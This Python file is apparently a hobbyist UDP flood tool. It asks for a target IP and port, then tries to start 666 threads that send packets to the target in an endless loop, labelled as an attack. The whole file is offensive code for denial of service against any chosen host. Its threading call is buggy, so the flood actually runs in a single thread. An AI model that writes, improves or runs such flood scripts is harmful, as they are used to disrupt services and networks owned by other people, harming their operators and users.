import socket
import threading

def udp_flood_helper(target_ip, target_port):
    print("Running attack...")
    while True:
        try:
            # udp socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto("placeholder spam string data".encode('ascii'), (target_ip, target_port))
        except socket.error:
            print("error")
            break

# 666 threads
def udp_flood():
    target_ip = input("Choose target IP: ")
    target_port = int(input("Choose target port: "))
    try:
        socket.inet_aton(target_ip)
    except:
        print("Invalid IP address. Try again.")
        quit()
    if target_port not in range(0, 65535):
        print("Invalid port number. Try again.")
        quit()
    
    for i in range(666):
        thread = threading.Thread(target=udp_flood_helper(target_ip, target_port))
        thread.start()

